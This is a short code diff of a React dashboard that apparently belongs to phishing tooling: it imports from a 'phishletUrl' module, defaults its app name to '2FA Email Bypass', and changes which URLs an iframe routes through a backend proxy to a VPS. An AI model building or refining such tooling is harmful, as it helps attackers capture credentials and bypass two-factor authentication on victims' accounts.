@@ -3,10 +3,9 @@ import axios from "axios";
 import Sidebar from "./Sidebar";
 import TerminalOutput from "./TerminalOutput";
 import useAsyncAction from "../hooks/useAsyncAction";
-import { getVpsIp, getRouterPort } from "../hooks/phishletUrl";
+import { getVpsIp } from "../hooks/phishletUrl";
 
 const VPS_IP = getVpsIp();
-const ROUTER_PORT = getRouterPort();
 const BASE = import.meta.env.VITE_API_URL || "";
 const APP_NAME = import.meta.env.VITE_APP_NAME || "2FA Email Bypass";
 
@@ -277,11 +276,12 @@ export default function Dashboard() {
                   ref={iframeRef}
                   src={
                     activeTab?.url &&
-                    !activeTab.url.includes(`:${VPS_IP}:`) &&
+                    !activeTab.url.startsWith(`http://${VPS_IP}/`) &&
+                    !activeTab.url.startsWith(`https://${VPS_IP}/`) &&
+                    !activeTab.url.startsWith(`http://${VPS_IP}:`) &&
+                    !activeTab.url.startsWith(`https://${VPS_IP}:`) &&
                     !activeTab.url.includes(":580") &&
-                    !activeTab.url.includes(":590") &&
-                    !activeTab.url.includes(`http://${VPS_IP}:${ROUTER_PORT}/`) &&
-                    !activeTab.url.includes(`http://${VPS_IP}/`)
+                    !activeTab.url.includes(":590")
                       ? `${BASE}/api/proxy?url=${encodeURIComponent(activeTab.url)}`
                       : activeTab?.url
                   }
